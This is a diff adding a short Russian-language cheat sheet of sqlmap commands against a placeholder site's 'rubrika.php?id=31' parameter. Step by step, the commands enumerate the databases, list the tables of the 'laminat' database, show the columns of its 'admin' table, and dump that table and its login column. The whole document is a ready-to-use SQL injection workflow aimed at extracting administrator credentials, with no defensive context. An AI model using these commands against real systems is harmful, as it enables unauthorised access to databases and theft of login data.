@@ -1,0 +1,14 @@
+Перечислить базы данных 
+sqlmap -u http://www.sqldummywebsite.name/rubrika.php?id=31 --dbs
+
+Построить список таблиц для базы данных laminat 
+sqlmap -u www.sqldummywebsite.name/rubrika.php?id=31 -D laminat --tables
+
+Показать колонки для таблицы admin  для базы данных laminat
+sqlmap -u www.sqldummywebsite.name/rubrika.php?id=31 -D laminat -T admin --columns
+
+Вывести дамп для таблицы adminдля базы данных laminat
+sqlmap -u www.sqldummywebsite.name/rubrika.php?id=31 -D laminat -T admin --dump
+
+Вывести содержимое колонки login для таблицы admin для базы данных laminat
+sqlmap -u www.sqldummywebsite.name/rubrika.php?id=31 -D laminat -T admin -C login --dump
